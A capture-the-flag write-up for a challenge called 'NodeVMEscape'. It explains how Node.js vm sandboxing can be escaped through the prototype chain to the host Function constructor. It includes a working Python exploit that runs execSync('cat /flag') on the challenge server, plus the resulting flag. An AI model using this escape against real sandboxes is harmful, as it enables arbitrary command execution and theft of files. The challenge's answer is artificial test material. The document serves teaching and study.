---
title: "NodeVMEscape"
ctf: "CSC-SNIST"
date: 2026-07-10
category: misc
difficulty: insane
points: 450
flag_format: "cyberstrike{...}"
author: "retr0"
---

# NodeVMEscape

## Summary

A Node.js sandbox uses the `vm` module to run untrusted JavaScript in an isolated context. While `vm` isolates globals like `process` and `require`, it does **not** sever the prototype chain back to the host runtime. `this.constructor.constructor` resolves to the host's `Function` constructor, which can evaluate arbitrary code in the host scope — yielding `process`, `require`, and full command execution to read `/flag`.

## Solution

### Step 1: Confirm the prototype chain reaches the host

The sandbox strips `process` and `require`, but the object prototype chain still crosses back into the host context. Querying `this.constructor.constructor` returns `function Function() { [native code] }` — the **host's** `Function` constructor, not a sandboxed one.

```
typeof process      -> undefined   (sandboxed out)
typeof require      -> undefined   (sandboxed out)
this.constructor.constructor -> function Function() { [native code] }  (HOST context)
```

### Step 2: Escape via the host Function constructor and read /flag

Call the host `Function` constructor with `return process` to retrieve the real `process` object, then walk `process.mainModule.require('child_process')` and execute `cat /flag`.

```python
import requests, json

TARGET = "http://chal.csc-snist.live:52944"

# The classic Node.js vm escape: the prototype chain crosses the sandbox boundary.
payload = {
    "code": "this.constructor.constructor('return process')()"
            ".mainModule.require('child_process')"
            ".execSync('cat /flag').toString()"
}

r = requests.post(f"{TARGET}/run", json=payload, timeout=30)
flag = r.json()["output"]
print(f"[+] FLAG: {flag}")
```

Actual output:

```
[+] FLAG: cyberstrike{5b19367e635f260a91edf9094609cc35}
```

The payload is well under the 512-char limit and completes within the 2s timeout.

## Why it works

`vm.runInNewContext` creates a new global object but reuses the same built-in constructors (`Function`, `Object`, `Array`) as the host. Any object inside the sandbox still has `.constructor.constructor === Function` from the host realm. Calling that `Function` with a string evaluates the string in the **host** scope, where `process`, `require`, and `child_process` are all available. The "isolation" only severed global variable bindings, not the prototype graph.

## Flag

```
cyberstrike{5b19367e635f260a91edf9094609cc35}
```
